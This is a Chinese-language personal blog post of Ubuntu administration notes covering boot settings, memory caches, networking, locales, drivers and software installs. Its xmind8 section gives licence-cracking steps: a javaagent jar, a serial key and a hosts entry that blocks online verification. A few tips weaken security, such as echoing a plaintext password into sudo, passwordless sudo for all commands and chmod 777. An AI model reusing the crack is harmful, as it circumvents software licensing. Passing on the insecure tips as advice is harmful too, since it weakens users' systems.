---
title: Ubuntu管理日记
date: 2017-12-21 10:38:09
tags: [ubuntu, 技巧]
---


## Ubuntu常识
- linux文件系统：
	+ /usr/bin: 一般存放为系统安装的应用
	+ /usr/local/bin: 一般存放为用户自己编译创建的应用
	+ 

## 酷炫Ubuntu

 - 开机时间：
	 - uptime
	 - uptime -v 查看版本
- 开机密码：
	+ sudo su第一次安装用户可以使用命令
	+ 然后切换到root后：passwd，即可修改root密码
- 忘记密码：
	+ 重启，按住shift，选择adanced，进入recovery模式
	+ mount -o rw,remount /
	+ ls /home
	+ passwd root
	+ reboot

- win+Ubuntu双系统：
	+ 参见我的csdn：http://blog.csdn.net/a550461053/article/details/58822451

- win与Ubuntu双系统启动顺序：
	- 修改/etc/default/grub
	- 定位到GRUB_DEFAULT=0
	- 后面数字代表启动项位置-1，我的win7启动项在第4位，所以数字改为3
	- sudo update-grub 更新启动列表

- 减少等待时间：
	- sudo gedit /etc/default/grub
	- 修改TIMEOUT=1
	- sudo update-grub2

- 减少swap的作用：默认是60
	- sudo sysctl vm.swappiness=10 //暂时生效
	- sudo gedit /etc/sysctl.conf
	- vm.swappiness=10 //添加

- 减少cache：
	+ free -m 查看内存得到的是：memory = free memory + buffers + cached
	+ df -h:查看硬盘大小
		* 磁盘若快满了：分析一下磁盘Disk Usage Analyzer工具，删除不必要的东西
	+ 查看文件夹大小：
		* 进入文件夹
		* du -sh
	+ 磁盘分析工具：
		* sudo apt install baobab
		* sudo baobab
	+ buffers:
		* dentry进行缓存（用于VFS、加速文件路径名到inode的转换）
		* 作用：缓存文件的元数据
			- 根据硬盘的读写设计的，把分散的写操作集中进行，减少磁盘碎片和硬盘的反复寻道，从而提高系统性能。
		* 使用：
			- linux有一个守护进程定期清空缓冲内容，也可以通过sync命令手动清空缓冲；
	+ cached：
		* 两种cache方式：Buffer Cache 和 Page Cache
		* 分别是：对磁盘块的读写；针对文件inode的读写
		* 作用：
			- 缓存文件的具体内容
			- 常用在磁盘的I/O请求上，如果有多个进程都要访问某个文件，则该文件变做成cache以方便下次被访问，缩短了I/O系统调用的时间
		* 特点：实际表明，过段时间linux也不会自动释放cache
		* 级别分类：
			- 一级L2 Cache：集成在CPU内部
			- 二级L2 Cache：早期一般是焊在主板上，现在也都集成在CPU内部，常用容量256K或512K
	+ 手动释放cache：
		* /proc是一个虚拟文件系统，可以通过对他的读写操作作为与kernel实体间进行通信的一种手段，也就是说可以通过修改proc的文件内容，来对kernel的行为作出调整。
		* 通过/proc/sys/vm/drop_caches来释放内存：
			- cat /proc/sys/vm/drop_caches：默认为0
			- sync ：将所有未写的系统缓冲区写到磁盘中，包含已修改的inode、已延迟的块I/O和读写映射文件
			- sudo su
			- echo 3 /proc/sys/vm/drop_caches：修改caches级别，3为释放pagecache、dentries和inodes
			- free -m：此时在查看，cache就减少很多了，可用内存增加
			- echo 0 /proc/sys/vm/drop_caches：最好再改回原来的默认值
		* 但其实没必要释放cache：
			- 因为真正可用的内存是：available=free+cache的
			- cache能够提高读写效率，减少对硬盘的I/O操作，

- apt update报错：
	+ 删除libappstream3：sudo apt remove libappstream3
	+ 

- 查看CPU：
	+ 物理cpu个数：cat /proc/cpuinfo | grep 'physical id' | sort | uniq | wc -l
	+ 查看cpu几核：cat /proc/cpuinfo | grep 'cores' | uniq
	+ 查看逻辑CPU: cat /proc/cpuinfo | grep 'processor' | wc -l
	+ 结果为：1,4,4所以说逻辑也为1*4，也就不支持超线程

- top高级：
	+ 高级htop：sudo apt install htop
	+ 流量检测：
		* sudo apt install nethogs
		* 使用：sudo nethogs eth0 指定网卡

- 桌面实时流量：
	- sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor 
	- sudo apt-get update 
	- sudo apt-get install indicator-sysmonitor 
	- indicator-sysmonitor & 后台运行;
	- 自启动在软件自己的设置里面
	- 显示的内容可自定义

- 快捷键：
	+ vi的时候，使用ctrl+s会锁定屏幕，无法输入，使用ctrl+q解锁即可
	+ 
- 移动Unity所处位置：
    gsettings set com.canonical.Unity.Launcher launcher-position Bottom

- 创建链接文件：软链接即可，可跨文件系统：ln -s 源文件 目标文件
 	- sudo ln -s /usr/local/anaconda3/bin/python /usr/bin/python
	- 跨文件系统，需要自动mount ： sudo gedit /etc/fstab
	- /dev/sda1 /media/win-C ntfs nls=utf8,umask=000   0   0

- 创建桌面快捷方式：

- ipv6+ipv4上网：网卡的时候：
	+ 一般是由于ipv6+ipv4混用造成的，把网络连接选项的ipv6选为ignore即可；但还是能够上ipv6~
	+ 或者把ipv6的选项改为：automatically addresses only.选择require ipv6才是用该配置连接
	+ 问题一：
		+ ipv6+ipv4只能ipv4上网，因为教育网一般都是动态分配ipv6地址的，Ubuntu产生临时地址会存在很久，冲突。—— 我自己的解决方法就是把ipv6选项改为automatically addresses only.
		+ 网上解决：ipv6开启的时候，Ubuntu会默认产生临时地址，用来对外界访问时候起到匿名作用，需要关闭，ifconfig这样就不会看到多个ipv6 global地址了。
			- 命令行方式：sudo gedit /etc/sysctl.d/10-ipv6-privacy.conf
			- 将net.ipvt6.conf.default.use_tempaddr改为0
			- 重新加载所有配置文件：sudo sysctl --system
			- 重新上网
			- ifconfig查看ipv6信息。
	+ 问题二：
		* 我的问题是都能上网，但是关闭ipv6临时地址时候，会变慢，卡顿。
		* 解决：
			- 使用network manager时候直接enable开启ipv6 privacy extensions的temporary address

- 静态IP：
	+ centos：
		* 虚拟机下：如果发现虚拟机无法桥接，找不到的时候，修改虚拟网络编辑器->还原默认设置即可。
		* 也可以直接修改网络的UI设置。
		* ifconfig 在centos7之后取消了该指令，用ip addr 
		* 修改主机名称：vim /etc/sysconfig/network
			- NETWORKING=yes  
			- HOSTNAME=centos
		* 修改网卡：vim /etc/sysconfig/network-scripts/ifcfg-eth0
			- BOOTPROTO=static  # 静态IP，动态用dhcp分配ip
			- IPADDR=10.10.28.107 
			- NETMASK=255.255.255.0 # 子网掩码
			- GATEWAY=10.10.28.1
		* 修改DNS：vim /etc/resolv.conf
			- 这样添加可能会失效，通过ui添加；DNS没有就上不了网。
			- nameserver 8.8.8.8
			- nameserver 101.198.199.200 # 指定当前城市最近的DNS服务器
			- nameserver 210.73.64.1 # 指定经路由器上指定的DNS服务器
		* 重启网络配置：service network restart
		* 

- Ubuntu系统中文编码：locale查看支持的字符集
	+ 安装相应的中文语言环境包：sudo apt-get install `check-language-support -l zh-hans`
	+ 法一：修改系统默认
		+ vi /etc/environment
		+ 添加：LANG="zh_CN.UTF-8"
	+ 法二：修改locale
		+ locale-gen zh_CN.UTF-8
		+ 或者：vi /var/lib/locales/supported.d/local
			* zh_CN.UTF-8 UTF-8
			* en_US.UTF-8 UTF-8
			* zh_CN.GB18030 GB18030
			* zh_CN.GBK GBK
	+ 重新登录即可
- vi支持中文输入：
	+ vi ~/.vimrc
	+ 添加：
		* set fileencodings=utf-8,gbk,chinese
		* let &termencoding=&encoding
	+ 说明：
		* 需要考虑：
			- 系统当前的locale编码类型
			- 文件本身编码
			- vi处理文件的自动编码识别
			- 客户端运行vi的终端所使用的编码类型
		* fileencodings表示支持的文件编码
		* termencoding表示输出到终端的转换，默认为空则不进行编码转换
		* encoding默认是采用的locale的系统编码，所以不需要直接指定termencoding，直接导入
- win下还是要使用sublime，不用txt打开文件。
	 sudo gedit /etc/environment
	可以看到如下内容：
	PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
	LANG="zh_CN.UTF-8"
	LANGUAGE="zh_CN:zh:en_US:en"第二行即是默认的中文字符编码。注：可以通过这里修改默认的中文编码字符，比如修改为：zh_CN.GBK。
  - 不能乱改，否则终端不能打开

 - 终端打开文件夹：而且默认自带root权限：nautilus $PWD

 - sudo without passwd: sudo visudo ;  username ALL=(ALL) NOPASSWD: ALL ;只是用于终端

 - 快捷键：super + w：布局;

 - guake:下拉终端e
	- ctrl+shift+t:新建标签页
	- ctrl+shift+w:关闭标签页

- 实时命令：
	+ watch -n 30 fortune-zh #  fortune 每次执行都会随机说一句谚语、名言、电影台词等，当然都是英文的。

- 开机自启动：
	+ sudo gedit /etc/rc.local
	+ 将要执行的命令添加在exit 0之前，即可自启动
		+ guake $
	+ 这种方法不是一个好的style，so：
		1. 建立一个run_server.sh文件
			# !/bin/bash
			guake $
		2. sudo chmod 755 run_server.sh
		3. sudo cp run_server.sh /etc/init.d/
		4. cd /etc/init.d/
		5. sudo update-rc.d run_server defaults 90 # 数字90表示一个优先级，越高越晚执行
		6. 若要移除该命令：sudo update-rc.d -f run_server.sh remove

 - dpkg -L packagename:查看安装位置

- 系统内核：
	+ 查看内核版本：
		* uname -a
		* 1.dpkg --list | grep linux-image
		* 2.dpkg --list | grep linux-headers
	+ 删除内核：
		* Sudo apt purge linux-image-4.4.0-21
		* Sudo apt purge linux-headers-4.4.0-21
		* 若上述方法报错，则：
			- a)sudo dpkg --purge linux-image-4.4.0-112-generic
			- b)Sudo apt update
			- c)sudo dpkg 
			- d)Sudo apt install -f
		* 各种尝试，如果还是不行：直接删除源目录/var/lib/dpkg/info/下面的文件：
			- 原理：删不到内核，主要是因为最新的内核配置文件没有配置，出现配置错误，所以直接删除错误的dpkg配置文件即可。
			- Sudo rm -f linux-image-4.4.0-112-generic*
			- Sudo rm -f linxu-image-extra-4.4.0-112-generic*
			- 然后重新sudo apt clean
			- Sudo apt update
			- Sudo apt install -f

- 修复U盘只读：
	+ 卸载U盘
	+ 插上U盘
	+ tail -f /var/log/syslog 查看动态日志，找到所在分区
	+ sudo dosfsck -v -a /dev/sdb4
	+ Windows下式：chkdsk命令

- 下载加速:
	- 安装uget:
		- sudo add-apt-repository ppa:plushuang-tw/uget-stable
		- sudo apt update
		- sudo apt install uget
	- 安装aria2:
		- sudo add-apt-repository ppa:t-tujikawa/ppa
		- sudo apt-get update
		- sudo apt install aria2
	- Firefox添加支持:
		- 插件flashget
		- 通过flashgot修改下载管理器
	- 配置uget:
		- sudo uget-gtk 
		- 直接点击super也可以
		- 选择最大连接数16
		- plugin选择aria2

- wifi热点:
	- sudo apt install plasma-nm
	- sudo apt install -f
	- 还报错:
		- sudo dpkg -i --force-overwrite /var/cache/apt/archives/libdbusmenu-qt5-2_0.9.3+16.04.20160218-1_amd64.deb
	- 运行: kde5-nm-connection-editor
	- 添加一个WiFi
	- wifi页:
		- connection name: 随便
		- SSID: 随便
		- mode: Access Point, 此模式安卓就可以访问了
	- wifi-Security页:
		- 密码
	- https://donjajo.com/creating-wi-fi-hotspot-in-ubuntu-visible-to-android-and-all-devices/#.WZPwVXWGNhE


- 画图工具:
	- sudo apt-get install  kolourpaint4
	- 打开即可

- 主题:
	- 安装unity管理工具Ubuntu Tweak:
		- ubuntu16.04需要修改:
			- wget -q -O - http://archive.getdeb.net/getdeb-archive.key | sudo apt-key add -
			- sudo sh -c 'echo "deb http://archive.getdeb.net/ubuntu xenial-getdeb apps" >> /etc/apt/sources.list.d/getdeb.list'
			- sudo apt-get update
		- sudo apt-get install unity-weak-tool ; 
	- Flatabulous主题:
		- 安装主题:
			- sudo add-apt-repository ppa:noobslab/themes
			- sudo apt-get update
			- sudo apt-get install flatabulous-theme
		- 安装图标:
			- sudo add-apt-repository ppa:noobslab/icons
			- sudo apt-get update
			- sudo apt-get install ultra-flat-icons
		- 修改主题和图标:
			- 打开unity工具, 修改主题即可

- sudo自带密码
	+ 使用-S参数使得sudo从标准输入流读入而不是终端设备
	+ echo password | sudo -S rm -rf a.file

## Ubuntu显示问题

- 常见问题：
	- 更新驱动: https://stackoverflow.com/questions/43016255/libegl-so-1-is-not-a-symbolic-link
	- 配有英伟达显卡的主机，装完 Ubuntu 16.04 后出现闪屏现象，是由于没有安装显卡驱动。

- NVIDIA安装过程
 安装NVIDIA Corporation GTX940
	1. 驱动下载
	从NVIDIA官网下载显卡对应的驱动安装文件
	NVIDIA-Linux-x86_64-...run

	2. 安装依赖
		+ 卸载旧版本NVIDIA驱动，没有安装过也执行一下
			* sudo apt remove --purge nvidia*
		+ 安装依赖项：
			* sudo apt update
			* sudo apt install dkms build-essential linux-headers-generic
		+ 将Ubuntu自带的nouveau驱动加入黑名单：
			* sudo vi /etc/modprobe.d/blacklist-nouveau.conf
			* 在文件 blacklist-nouveau.conf 中加入如下内容：
				blacklist nouveau
				blacklist lbm-nouveau
				options nouveau modeset=0
				alias nouveau off
				alias lbm-nouveau off
		+ 禁用 nouveau 内核模块:
			* echo options nouveau modeset=0 | sudo tee -a /etc/modprobe.d/nouveau-kms.conf
			* sudo update-initramfs -u
		+ 重启：reboot
	3. 开始安装驱动：
		- 上一步重启后要直接按ctrl+alt+F1进入字符终端界面
		- 关闭图形界面：
			+ sudo service lightdm stop
		- 安装驱动：
			+ sudo chmod u+x NVIDIA-Linux-x86_64-361.45.11.run
			+ sudo ./NVIDIA-Linux-x86_64-361.45.11.run
		- 重启：reboot
	4. 安装完毕


- 黑屏问题：
	+ 开机按住shift即可进入grub系统引导界面
	+ 再按e可以进入恢复模式的启动脚本编辑模式，
		* 修改root密码：将最后ro开始到最后部分修改为：rw single init=/bin/bash
		* 然后ctrl+x启动系统
		* 即可进入root可编辑的模式了
		* 然后进一步修改/etc/group文件，将自己的用户添加到admin组，保存，
		* 重启，即可。
	+ 如果是双系统，通过win的easyBCD恢复启动引导：http://blog.csdn.net/u010099080/article/details/52275502
	+ 如果是单系统，通过制作Ubuntu修复盘：https://help.ubuntu.com/community/Boot-Repair
- 主动灭屏：
	+ gnome-screensaver-command -a
	+ xset dpms force off
	+ 都行：可以添加为启动器

- xorg进行：
	+ 是linux图形界面的基本模式，关了的话，图形界面就用不了。
	+ 进入tty1，然后查看xorg的id
	+ ps -t tty7
	+ kill id即可
	+ xorg会自动重启


## 常用软件安装

- apt：
	+ apt：advanced package tools

- 非root用户安装软件：
	1. 获取源代码，一般是wget方式，ubuntu可以使用apt-get source来获取源代码。
	2. 解压源代码，一般使用tar -zxvf xxx.tar.gz即可
	3. 切换到解压后的目录，运行 ./configure。其选项可以通过 ./configure –help来获取，非root用户下最重要的应该是定义安装目录，即应该定义 ./configure –prefix=/path/to/bin， 对于一些依赖库，可能还需要使用 ./configure  –prefix=xxx –with-xx-dir=xxx这种形式。
	4. 接着是编译源代码和安装软件： make &&  make install。这两条命令可以分开来用，因为编译的时候可以指定参数 -j来并行编译，这样能够加快编译进度。。
	5. 更新path路径。使用export PATH=/path/to/bin:$PATH，这句话在shell窗口运行只在本次会话中有效，可以将其写到.bashrc或者.bash_profile里面使其对当前用户有效。
	6.如果安装的是动态链接库，则需要更新动态链接库路径： export LD_LIBRARY_PATH=/path/to/library:$LD_LIBRARY_PATH，同样是export命令，最好将其写在.bashrc这类文件下面以便登陆的时候自动调用。
	

- 打包apt安装包:
	- 下载安装包: sudo apt download openssh-server
	- 下载需要依赖: sudo apt build-dep --download-only -o dir::cache=/home/yuziqi/Download/myinstaller openssh-server
	- 下载额外的依赖: sudo apt download openssh-sftp-server openssh-client
	- 给所有文件权限: sudo chmod 777 *
	- 安装: sudo dpkg -i *.deb

 - pip：pip安装：pip install package
 	- sudo apt install python-pip
 	- sudo pip uninstall docker-compose
 	- 升级docker-compose: sudo pip install -U docker-compose
 	- sudo pip install --upgrade pip 升级pip
 	- sudo apt-get -f install 修复安装
 	- sudo apt-get upgrade升级已经安装的包
 	- sudo apt  dist-upgrade 升级系统
 	- 二进制包安装的方式，卸载直接rm即可
- apt-get 安装的包是系统化的包，在系统内完全安装。源是ubuntu仓库。pip install安装的python包，可以只安装在当前工程内。且源是pyPI和ubuntu仓库。

- 修改源:
	- sudo vim /etc/apt/source.list
	- 添加: https://mirrors.ustc.edu.cn/repogen/
	deb https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse
	deb-src https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse

	deb https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse
	deb-src https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse

	deb https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
	deb-src https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse

	deb https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
	deb-src https://ipv6.mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse	
	- 更新源: sudo apt-get update
	- 更新系统: sudo apt-get upgrade

- PPA，表示 Personal Package Archives，也就是个人软件包集。

- wps:
	- 卸载libreOffice:
		- sudo apt-get remove libreoffice-common
	- 删除Amazon连接:
		- sudo apt-get remove unity-webapps-common
	- 删除不常用软件: (先不删)
		- sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot 
		- sudo apt-get remove gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku  landscape-client-ui-install  
		- sudo apt-get remove onboard deja-dup 
	- 安装wps:
		- 官网下载wps
		- sudo dpkg -i wps-office_10.1.0.5672~a21_amd64.deb
		- 若缺少依赖:sudo apt install -f
- sublime:
	 - sublime3安装:
	     sudo add-apt-repository ppa:webupd8team/sublime-text-3
	     sudo apt-get update
	     sudo apt-get install sublime-text
	     subl
	 - sublime3 中文字体问题:
	 	- git clone https://github.com/lyfeyaj/sublime-text-imfix.git
	    cd sublime-text-imfix
	    ./sublime-imfix
	    Done! Re-login Xwindows and ok.
	    但是只支持从终端启动：subl
	    	- 中英文字体不对齐：
	    	settings："font_face": "微软雅黑",
	 - sublime3 python:
	 	- package: anaconda

 - sogoupinyin:sudo dpkg -i ./sogoupinyin....deb
 	+ 设置里面的语言支持+text entry设置输入法
 	+ 缺少依赖,用：sudo apt-get -f install 下面不要也可以，重启即可～
 	+ 还是不行：sudo apt-get purge fcitx; 清理文件，包括配置文件 
 	+ 重启 - dpkg -i sogou..deb ; sudo apt-get -f install ; 重启
 	+ 还是搜狗的用着舒服～～～
    	+ 搜狗很容易出问题: 
    	 	+ 就是回车+分号同时按的时候
    	 	+ 此时: 运行一下fictx即可
    	+ fcitx占用过多内存和cpu：
    		* fcitx的云服务器默认为google，打不开就会频繁请求，占用资源。
    		* 打开fcitx的配置界面
    		* 查看addon - 勾选advance
    		* 选择cloud pinyin选项 - configure
    		* 将cloud pinyin source 改为baidu即可

- youdao-dict:
	- sudo dpkg -i ./youdao-dict.deb
	- 缺少依赖: sudo apt -f install
	- dpkg -i ./youdao-dict.deb
	- ~可选问题:Ubuntu16.04, 需要重新打包:
		- 解压目录: dpkg -X ./youdao-dict_1.1.0....deb youdao-dict
		- 解压依赖: dpkg -e ./youdao-dict_1.1.0....deb youdao-dict/DEBIAN
		- 修改依赖: 删除control中, Depends里面的gstreamer0.10-plugins-ugly
		- 重新打包: dpkg-deb -b youdao-dict youdaobuild.deb
		- 重新安装: dpkg -i youdaobuild.deb
	- 启动遇到问题:
		- youdao-dict
		- 报错: No module named 'Xlib'
		- 解决: sudo apt install python-xlib

- xmind8:
	1.下载官方安装包，安装
	2.下载xmind.jar 链接: https://pan.baidu.com/s/1i5uonrf 密码: 8cjt，放在安装目录。
	3.在XMind.ini和XMind-original.ini后面添加-javaagent:xmind.jar
	4.打开configuration文件夹修改config.ini最后一行为net.xmind.verify.ui.disallowsLicenseActivation=false（使用写字板打开，不要用记事本）
	5.打开xmind 8  输入序列号，邮箱随便填写
	XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345
	- 补充内容 (2017-5-30 09:49):
	另外，激活之前在 修改hosts文件添加  "127.0.0.1 www.xmind.net" 防止软件联网验证序列号

 - wine-qq: sudo apt install wine; winetrick ; QQIntel
 	- sudo add-apt-repository ppa:wine/wine-builds
 	- sudo apt update
 	- sudo apt-get install winehq-devel
 	- 将wineQQ解压到~/下:
 		- 下载: https://pan.baidu.com/share/link?shareid=923804833&uk=1397526986
 		- tar xvf wineQQ8.9_19990.tar.xz -C ~/
 		- 会提示安装wine的其他插件;
 	- 启动qq即可
 	- 卸载qq:
 		- rm -rf ~/.wine
		- rm -rf ~/.local/share/applications/wine-QQ.desktop
		- rm -rf ~/.local/share/icons/hicolor/256x256/apps/QQ.png
		- rm -rf ~/.fonts/simsun.ttc

- labelme:
	- 安装python版本的:
	- sudo apt-get install python-qt4 pyqt4-dev-tools
	- sudo pip install labelme
		- 报错: install the python-tk package
		- 解决: sudo apt install python-tk
	- 运行: labelme

- 安装vim，然后安装fish，更好的shell界面：
	- sudo apt-get fish
	- fish

- 安装R:
	- sudo apt-get install r-base
	- R
	- RStudio的安装;
- gcc: 
	- gcc降级:
		    sudo apt-get install g++-4.9
		    sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.9 20
		    sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 10
		    sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-4.9 20
		    sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-5 10
		    sudo update-alternatives --install /usr/bin/cc cc /usr/bin/gcc 30
		    sudo update-alternatives --set cc /usr/bin/gcc
		    sudo update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
		    sudo update-alternatives --set c++ /usr/bin/g++
    	- gcc恢复:
		    sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.9 10
		    sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 20
		    sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-4.9 10
		    sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-5 20
		    sudo update-alternatives --install /usr/bin/cc cc /usr/bin/gcc 30
		    sudo update-alternatives --set cc /usr/bin/gcc
		    sudo update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
		    sudo update-alternatives --set c++ /usr/bin/g++
 - docker：
 	- sudo apt-get install docker.io
 	- docker version ; 只显示client 1.12.6
 	- sudo systemctl status docker ; 运行daemon
 	- sudo usermod -aG docker $(whoami) ; 防止docker每次都要sudo
 	- sudo apt install docker-compose
 	- docker-compose version ; docker-compose1.5.2
 	- 版本太低，so用pip安装docker-compose
 	- sudo pip install docker-compose
 	- 更新：
 		+ pip install -U docker-compose
 	- docker-compose -h ; 查看用法
 	- 卸载：dpkg --list | grep docker
 		- 卸载程序和配置：sudo apt-get --purge remove docker
 		- 只卸载程序：sudo apt-get remove docker
 		- sudo apt-get remove docker.io
 		- sudo apt-get remove docker-compose

- docker命令：
	+ 删除镜像：
	+ 问题1：docker setup: could not find an available, non-overlapping IPv4 address pool
		* 清除docker的网络缓存：docker network prune
		* 或者试试：sudo service network-manager restart
	+ 问题2：
		* NFS服务意外断开，导致挂载的客户端“df -Th”命令无法使用，及挂载目录无法“cd”“ls”
		* 解决：
			- 1、强制取消客户端挂载：umount -lf /mnt
			- 2、重启NFS服务，客户端和服务端都需要重启: systemctl restart nfs ; systemctl restart rpcbind
			- 3、重新挂载NFS: mount 192.168.1.1:/data /data.
	+ docker拷贝镜像：
		* 保存镜像为文件：
			- docker save -o a.save a.image
		* 从文件载入为镜像：
			- docker load --input a.save
			- 或者：docker load < a.save
		* 

- golang：
	- 下载: sudo wget https://storage.googleapis.com/golang/go1.7.4.linux-amd64.tar.gz
	- 解压后, 复制到GOROOT目录下:sudo cp -r go/ /usr/lib/
	- 进入vi ~/.bashrc
	- export GOROOT=/usr/lib/go # go安装的位置，也是go可执行文件的位置；
	- export GORACH=amd64
	- export GOOS=linux
	- export PATH=${PATH}:$GOROOT/bin
	- export GOPATH=$HOME/project/go #工作目录，至少包含bin/pkg/src
	- 32位则rach=386；win则改goos=windows
	当你运行go build测试你的chaincode编译时，Go将在$GOPATH/src目录中查找你在importchaincode 的块中列出的非标准依赖。

	- 必须新建：$GOPATH/src/go/github.com/hyperledger/
	- 必须新建：$GOROOT/src/go/github.com/hyperledger/
		+ sudo mkdir ../ -p
	- 安装了:sudo apt install mercurial
	- 安装go中文教程：sudo go get bitbucket.org/mikespook/go-tour-zh/gotour
	- sudo go env是root环境下的环境变量了
	- go env才是当前目录下的环境变量
	- 可以sudo su 到root下,然后执行source /etc/profile, 再次执行命令
	- sudo -E go env保持当前用户下的环境变量，以root身份执行命令
	- sudo -E go install hello
	- su 一个用户； 或者sudo su；都是临时登录，所以/etc/profile对其无效，是用户变量，只对登录的所有用户有效，而/etc/environment为系统变量，对系统有效；
	- 卸载go：
		+ sudo apt remove golang-go
		+ sudo apt remove --auto-remove golang-go
		+ source ~/.bashrc # 使生效

- go get指令报错：unrecognized import path
	+ 问题：
		* go get google.golang.org/grpc
		* 结果：package google.golang.org/grpc: unrecognized import path "google.golang.org/grpc" (https fetch: Get https://google.golang.org/grpc?go-get=1: dial tcp 74.125.28.14:443: i/o timeout)
	+ 解决方法：
		1、建立相关文件夹
			mkdir -p $GOPATH/src/google.golang.org/
		2、命令行打开文件夹
			cd $GOPATH/src/google.golang.org
		3、从Github上克隆其他的仓库
			git clone https://github.com/Agzs/grpc grpc
		4、 安装仓库
			cd $GOPATH/src/
			go install google.golang.org/grpc


- pycharm安装：
	1. 获取pycharm.tar.gz
	2. cp pycharm.tar.gz ~/software/
	3. tar -zxvf pycharm.tar.gz
	4. ./bin/pycharm.sh
	5. 创建desktop:
		- sudo vi /usr/share/applications/pycharm.desktop
			[Desktop Entry]
			Encoding=UTF-8
			Type=Application
			Name=pycharm //程序名称, 必选
			GenericName=Pycharm3 
			Comment=Pycharm-edu-3.5.1:The Python IDE //程序描述, 可选
			Exec="/home/yuziqi/software/pycharm/pycharm-edu-3.5.1/bin/pycharm.sh" %f //程序启动命令, 必选
			Icon=/home/yuziqi/software/pycharm/pycharm-edu-3.5.1/bin/pycharm.png //程序图标. 可选
			Terminal=false // 是否在终端运行, 可选
			Categories=Application;Development; // 注明在菜单栏中显示的类别, 可选
					- sudo chmod +x /usr/share/applications/pycharm.desktop
					- cp /usr/chare/applications/pycharm.desktop ~/Desktop/

- linux系统read only file system：
	+ mount -o remount, rw /
	+ 再改回只读：mount -o ro, remount /

- dia工具:
	- sudo apt install dia
	- dia  # 画图
- xmind工具:
	- 由于提前安装了其他xmind, 
		- 不删除配置:
			- sudo dpkg -r xmind
		- 删除配置:
			- sudo dpkg -P xmind
		- 需要彻底删除, 包括依赖项: 
			- sudo apt autoremove --purge xmind
	- 官网下载
	- sudo dpkg -i xmind-7.5-linux_amd64.deb
	- 出现问题就:
	- sudo rm /usr/share/mime/packages/kde.xml 
	- sudo update-mime-database /usr/share/mime
	- sudo dpkg -i xmind-7.5-linux_amd64.deb
- Atom:
	- Google开发的文本编辑器
- 截图工具:
	- 法1:
		- sudo apt install shutter
		- 好用!
	- 法2:
		- 使用快捷键printsript截图
		- 图片裁剪:
			- sudo apt install gthumb
			- gthumb启动编辑软件
- tar:
        tar 参数：
          -c：将文件打包（但不压缩）create
          -x：将打包文件解压   excha
          -z：将打包文件压缩。
          -v：把压缩过程显示出来。
          -f：我的理解是用当前的名字。如xxx目录，那么打包之后就是xxx.tar。压缩之后就是xxx.tar.gz
       ex:
          打包目录下的workspace（不压缩）
             tar -cvf workspace.tar workspace
          打包并压缩目录下的worksapce
             tar -zcvf workspace.tar.gz workspace
          解压
          这需要看后缀名来的，当后缀名有.gz时表示这个包经过压缩处理的。反之，者没有。但都可以用tar 来解压的   
             1. 解包 workspace.tar
                tar -xvf worksapce.tar
             2. 解包 workspace.tar.gz
                tar -xvf workspace.tar.gz

       tar  [options]
       Operations:
	       [-]A --catenate --concatenate
	       [-]c --create
	       [-]d --diff --compare
	       [-]r --append
	       [-]t --list
	       [-]u --update
	       [-]x --extract --get
	       --delete

       Common Options:
	       -C, --directory DIR
	       -f, --file F
	       -j, --bzip2
	       -p, --preserve-permissions
	       -v, --verbose
	       -z, --gzip
-zip：
	+ tar速度快，但只是一个打包工具，不负责压缩
	+ 压缩：zip -r a.zip directory
	+ 解压：unzip a.zip

- 配置python3-GAN项目环境:
	- sudo apt purge mysql-server
	- sudo rm -rf /etc/mysql
	- sudo apt install mysql-server
	- sudo apt install swig
	- sudo -E python setup.py install 
	- alsa报错: sudo apt-get install libasound2-dev
	- 权限不足: python setup.py install --user
		- 或者自己指定位置: python setup.py install --prefix=/usr/local/../site-packages/
	- 权限:
		- sudo chown yuziqi:yuziqi a.py
		- sudo chown root:root a.py
		- 需要在/下, 挂载的其他盘符默认是root:root, 改不了
	- python ....
	- 报错: python的pickle.load()需要指明rb和wb, 而且要指明encoding="utf-8"
	- 
python2:
	- 新建anaconda命令: conda create -n python27 python=2.7 anaconda
	- source activate python27
	- 作者所用的tensorflow的版本<=0.12:
		- rnn_gan.py的两个split(1, , )
			- 第一个位置的1 和 第三个位置的数据互换位置
		- rnn_gan.py的9处: tf.nn.rnn_cell换为:tf.contrib.rnn
		- tf.concat in 1.0 is indeed axis and not concat_dim
			- concat_dim替换为axis
		- rnn_gan.py的3处: 先定义lstm_cell()函数, 再调用: tf.contrib.rnn.MultiRNNCell([lstm_cell() for _ in range(FLAGS.num_layers_g)], state_is_tuple=True)
		- tf.pack has been renamed as tf.stack.
		- tf.nn.bidirectional_rnn 替换为: tf.contrib.rnn.static_bidirectional_rnn
		- 1.0和1.1的区别直接修改版本了~: conda install tensorflow==1.0

python3: 
	import urllib.parse
	import urllib.request
	urllib2.Request > urllib.request.Request()
